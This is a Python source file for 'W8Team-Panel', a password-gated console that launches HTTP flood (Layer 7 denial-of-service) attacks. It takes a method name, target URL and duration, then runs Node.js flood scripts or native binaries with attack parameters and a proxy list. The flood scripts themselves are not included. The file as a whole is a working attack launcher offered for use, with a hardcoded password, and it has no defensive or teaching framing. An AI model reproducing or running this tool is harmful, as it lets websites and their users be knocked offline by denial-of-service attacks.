import socket
import random
import string
import threading
import urllib
import subprocess
import shutil
import colorama
import os
import sys
import re
import requests
import json
from time import sleep
from datetime import datetime, date
import codecs

# Project root (works no matter what the current working directory is)
BASE_DIR = os.path.dirname(os.path.abspath(__file__))
L7_DIR = os.path.join(BASE_DIR, "L7")
blueVal = "94m"
redVal = "91m"
greenVal = "32m"
whiteVal = "97m"
yellowVal = "93m"
cyanVal = "96m"
normal = "\033["
bold = "\033[1;"
italic = "\x1B[3m"
blue = normal + blueVal  # Blue Color Normal
red = normal + redVal  # Red Color Normal
green = normal + greenVal  # Green Color Normal
white = normal + whiteVal  # white Color Normal
yellow = normal + yellowVal  # yellow Color Normal
cyan = normal + cyanVal  # Cyan Color Normal
blueBold = bold + blueVal  # Blue Color Bold
redBold = bold + redVal  # Red Color Bold
greenBold = bold + greenVal  # Green Color Bold
whiteBold = bold + whiteVal  # white Color Bold
yellowBold = bold + yellowVal  # yellow Color Bold
cyanBold = bold + cyanVal  # Cyan Color Bold


def prints(start_color, end_color, text):
    start_r, start_g, start_b = start_color
    end_r, end_g, end_b = end_color

    for i in range(len(text)):
        r = int(start_r + (end_r - start_r) * i / len(text))
        g = int(start_g + (end_g - start_g) * i / len(text))
        b = int(start_b + (end_b - start_b) * i / len(text))

        color_code = f"\033[38;2;{r};{g};{b}m"
        print(color_code + text[i], end="")
    
start_color = (255, 255, 255)
end_color = (0, 0, 255)

class Color:
    colorama.init()


def clear_screen():
    os.system("cls" if os.name == "nt" else "clear")


def _try_install_nodejs_npm_linux():
	"""Debian/Ubuntu: run apt install (sudo if not root)."""
	cmd = "sudo apt-get update && sudo apt-get install -y nodejs npm"
	if hasattr(os, "geteuid") and os.geteuid() == 0:
		cmd = "apt-get update && apt-get install -y nodejs npm"
	print("\033[36m[Check] Running:\033[0m " + cmd.split("&&")[0].strip() + " && ...")
	subprocess.run(cmd, shell=True)


def check_runtime_dependencies():
	"""
	Runs first before login. Ensures Node.js + npm exist.
	On Linux, if missing, runs: sudo apt-get update && sudo apt-get install -y nodejs npm
	"""
	node = get_node_executable()
	npm = shutil.which("npm")

	if not node:
		print("\033[36m[Check] Node.js not found — fixing...\033[0m")
		if sys.platform.startswith("linux"):
			_try_install_nodejs_npm_linux()
			node = get_node_executable()
		if not node:
			print("\033[91m[MISSING] Node.js still not available.\033[0m")
			if not sys.platform.startswith("linux"):
				print("  macOS: brew install node")
				print("  Windows: https://nodejs.org/")
			print("  Or set NODE_BINARY to the full path of node.")
			sys.exit(1)

	if not npm:
		print("\033[36m[Check] npm not found — fixing...\033[0m")
		if sys.platform.startswith("linux"):
			_try_install_nodejs_npm_linux()
		npm = shutil.which("npm")
		if not npm:
			print("\033[93m[WARN] npm still missing. Run:\033[0m")
			print("  sudo apt-get update && sudo apt-get install -y nodejs npm")

	print("\033[32m[Check] OK — Node.js / npm ready\033[0m\n")


def get_node_executable():
    """
    Resolve the Node.js binary. Some Linux images only expose `nodejs`, or have no
    `node` on PATH; CI/devcontainers may need NODE_BINARY=/path/to/node.
    """
    env = (os.environ.get("NODE_BINARY") or "").strip()
    if env and os.path.isfile(env) and os.access(env, os.X_OK):
        return env
    for name in ("node", "nodejs"):
        path = shutil.which(name)
        if path:
            return path
    for fallback in ("/usr/bin/node", "/usr/local/bin/node", "/opt/nodejs/bin/node"):
        if os.path.isfile(fallback) and os.access(fallback, os.X_OK):
            return fallback
    return None


def run_node_l7(script_args):
    """Run Node with arguments inside the L7 folder (cross-platform)."""
    node = get_node_executable()
    if not node:
        print(
            "\033[91mNode.js not found in PATH.\033[0m\n"
            "  Install Node.js (https://nodejs.org/) or on Debian/Ubuntu: sudo apt install nodejs npm\n"
            "  Or set NODE_BINARY to the full path of the node executable, e.g.:\n"
            "  export NODE_BINARY=/usr/bin/node"
        )
        return
    subprocess.run([node] + script_args, cwd=L7_DIR, shell=False)


def run_l7_binary(binary_name, args):
    """Run a native binary in L7; prefers .exe on Windows when present."""
    path = os.path.join(L7_DIR, binary_name)
    if os.name == "nt" and not os.path.isfile(path):
        alt = os.path.join(L7_DIR, binary_name + ".exe")
        if os.path.isfile(alt):
            path = alt
    subprocess.run([path] + args, cwd=L7_DIR, shell=False)


def help():
	clear_screen()
	print("""\033[36m
__          __  ___   _______                         
\ \        / / / _ \ |__   __|                        
 \ \  /\  / / | (_) |   | |     ___   __ _  _ __ ___  
  \ \/  \/ /   > _ <    | |    / _ \ / _` || '_ ` _ \ 
   \  /\  /   | (_) |   | |   |  __/| (_| || | | | | |
    \/  \/     \___/    |_|    \___| \__,_||_| |_| |_|
                                                      
                                                      
           [!] THIS SCRIPT Modfty BY W8SOJIB

[!] USAGE -> { FOR START ATTACK ! }

[!] TYPE -> [METHOD] [URL] [TIME] 

[!] NOTE ->
METHOD: FLOOD Input finally you can enter bypass/flood

[!] LAYER 7

       • NOX
       • 404
       • YOLO
       • TLS
       • BOT
       • CFM
       • FLOOD 
       
\033[0m""")

def main():
	clear_screen()
	print("""\033[36m
__          __  ___   _______                         
\ \        / / / _ \ |__   __|                        
 \ \  /\  / / | (_) |   | |     ___   __ _  _ __ ___  
  \ \/  \/ /   > _ <    | |    / _ \ / _` || '_ ` _ \ 
   \  /\  /   | (_) |   | |   |  __/| (_| || | | | | |
    \/  \/     \___/    |_|    \___| \__,_||_| |_| |_|
                                                      
                                                      
                                                               
           [!] THIS SCRIPT Modfty BY W8SOJIB 

						   
 """)

	while True:
		sys.stdout.write(f"\x1b]2;[\] W8Team-Panel :: Online Users: [1] :: Attack Sended: [1/10]\x07")
		sin = input("\033[0;30;46mW8SOJIB@PANEL\x1b[1;37m\033[0m:~# \x1b[1;37m\033[0m")
		sinput = sin.split(" ")[0]
		if sinput == "clear" or sinput.lower() == "cls":
			clear_screen()
			continue
		if sinput == "help" or sinput == "HELP" or sinput == ".help" or sinput == ".HELP" or sinput == "menu" or sinput == ".menu" or sinput == "MENU" or sinput == ".MENU":
			help()

#########LAYER-7########  

		elif sinput == "FLOOD" or sinput == "flood":
			try:
				target = sin.split()[1]
				duration = sin.split()[2]
				run_node_l7(["flooderv2.js", target, duration, "10", "proxy.txt", "512"])
				clear_screen()
			except (ValueError, IndexError):
				continue

		elif sinput == "cfm" or sinput == "CFM":
			try:
				target = sin.split()[1]
				duration = sin.split()[2]
				run_node_l7(["UAM.js", target, duration, "64", "10", "proxy.txt"])
				clear_screen()
			except (ValueError, IndexError):
				continue

		elif sinput == "BOLT" or sinput == "bolt":
			try:
				url = sin.split()[1]
				duration = sin.split()[2]
				run_l7_binary("BOLT", [url, duration, "64", "10"])
				clear_screen()
			except (ValueError, IndexError):
				continue

		elif sinput == "OMG" or sinput == "omg":
			try:
				url = sin.split()[1]
				duration = sin.split()[2]
				run_l7_binary("OMG", ["GET", url, "proxy.txt", duration, "64", "10"])
				clear_screen()
			except (ValueError, IndexError):
				continue

		elif sinput == "YOLO" or sinput == "yolo":
			try:
				url = sin.split()[1]
				duration = sin.split()[2]
				run_node_l7(["YOLO.js", url, duration, "64", "10", "proxy.txt"])
				clear_screen()
			except (ValueError, IndexError):
				continue

		elif sinput == "TLS" or sinput == "tls":
			try:
				url = sin.split()[1]
				duration = sin.split()[2]
				run_node_l7(["TLS.js", "GET", url, "proxy.txt", duration, "64", "10"])
				clear_screen()
			except (ValueError, IndexError):
				continue

		elif sinput == "NOX" or sinput == "nox":
			try:
				url = sin.split()[1]
				duration = sin.split()[2]
				run_node_l7(["NOX.js", url, duration, "64", "10", "proxy.txt"])
				clear_screen()
			except (ValueError, IndexError):
				continue

		elif sinput == "BOT" or sinput == "bot":
			try:
				url = sin.split()[1]
				duration = sin.split()[2]
				run_node_l7(["BOT.js", url, duration, "64", "10", "proxy.txt"])
				clear_screen()
			except (ValueError, IndexError):
				continue

		elif sinput == "404":
			try:
				url = sin.split()[1]
				duration = sin.split()[2]
				run_node_l7(["404.js", url, duration, "64", "10", "proxy.txt"])
				clear_screen()
			except (ValueError, IndexError):
				continue
		
					
 
def login():
	check_runtime_dependencies()
	sys.stdout.write(f"\x1b]2;[\] W8Team-Panel :: Online Users: [1] :: Attack Sended: [1/10]\x07")
	clear_screen()
	passwd = "W8Team"
	print("""\033[36m
__          __  ___   _______                         
\ \        / / / _ \ |__   __|                        
 \ \  /\  / / | (_) |   | |     ___   __ _  _ __ ___  
  \ \/  \/ /   > _ <    | |    / _ \ / _` || '_ ` _ \ 
   \  /\  /   | (_) |   | |   |  __/| (_| || | | | | |
    \/  \/     \___/    |_|    \___| \__,_||_| |_| |_|
                                                      
                                                      
                                                              
           [!] THIS SCRIPT Modfty BY W8SOJIB 

						   
\033[0m""")
	password = input("\033[36m[\033[32mPASSWORD\033[36m]:\033[0m ")
	if password != passwd:
		print("")
		sys.exit(1)
	print("\033[36mSuccessfully Login to ur Account")
	sleep(1)
	main()

login()
